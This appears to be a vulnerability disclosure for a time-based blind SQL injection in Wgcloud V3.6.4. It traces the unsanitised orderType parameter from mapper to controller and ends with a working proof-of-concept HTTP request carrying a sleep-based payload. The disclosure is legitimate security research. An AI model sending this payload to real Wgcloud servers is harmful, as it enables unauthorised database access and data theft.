# Wgcloud V3.6.4 SQL Injection Vulnerability
##### Vulnerability Location: /portInfo/list
##### Affected Range: Wgcloud V3.6.4
##### Vulnerability Cause: classes/mybatis/mapper/PortInfoMapper.xml contains a serious security vulnerability. The manipulation of the argument orderType leads to sql injection. The attack can be launched remotely.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions;
##### Link: https://www.wgstart.com/
# Vulnerability recurrence

漏洞触发点：classes/mybatis/mapper/PortInfoMapper.xml

<img width="731" height="332" alt="image" src="https://github.com/user-attachments/assets/1369e9e0-e2b9-4da0-a7ca-a5364d032d1a" />

orderby、orderType直接拼接到了 SQL 语句中。往上层调用：

<img width="726" height="175" alt="image" src="https://github.com/user-attachments/assets/7aa5bbd4-cd1e-4424-b4d1-03f00dac2c7a" />

在 Services 层找到调用，接受的参数是 Map 层的 params 以及 page/pagesize。直接讲 params 参数传入 Mapper 层。
继续往上看：classes/com/wgcloud/controller/PortInfoController.java

<img width="721" height="231" alt="image" src="https://github.com/user-attachments/assets/83183d45-7f04-4e3e-8c00-602582e63852" />

同样往上层找到 Controller 层！这里为了方便测试添加了一个测试数据：

<img width="727" height="173" alt="image" src="https://github.com/user-attachments/assets/6a90723c-dcf2-4b6f-8d9c-d05c4acecfa0" />

同样orderBy 和orderType 参数是 portInfo 类中的信息，跟进：

<img width="736" height="251" alt="image" src="https://github.com/user-attachments/assets/084edf6e-5afa-400e-8d7b-04c250b54faf" />

并未找到参数，发现该类继承了BaseEntity，于是继续跟进：

<img width="671" height="187" alt="image" src="https://github.com/user-attachments/assets/6216baf1-41a7-4000-a388-d4b296e23dce" />

仅仅判断了orderBy 的长度，并未判断ordertype的参数！于是我们可以尝试利用ordertype来完成 SQL 注入的利用。

<img width="1427" height="296" alt="image" src="https://github.com/user-attachments/assets/8c7493ba-ed35-407d-afe7-ca3613f929f9" />

判断数据库名是不是WGCLOUD，如果是则会延迟 2 秒：

<img width="1364" height="308" alt="image" src="https://github.com/user-attachments/assets/b6abd603-dc0d-402b-8269-82f3ba4dc3af" />

如果不是的话，就不会延迟：

<img width="1316" height="358" alt="image" src="https://github.com/user-attachments/assets/85bfb3e3-38da-43b4-8b0e-72ea14a1890d" />

# POC
```
GET /portInfo/list?orderBy=if&orderType=(database()='WGCLOUD1',sleep(2),0) HTTP/1.1
Host: 192.168.2.133:9999
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.2.133:9999/portInfo/edit
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wgcloud-server=2D9FAFAF58977B75C309422E54B5D544


```
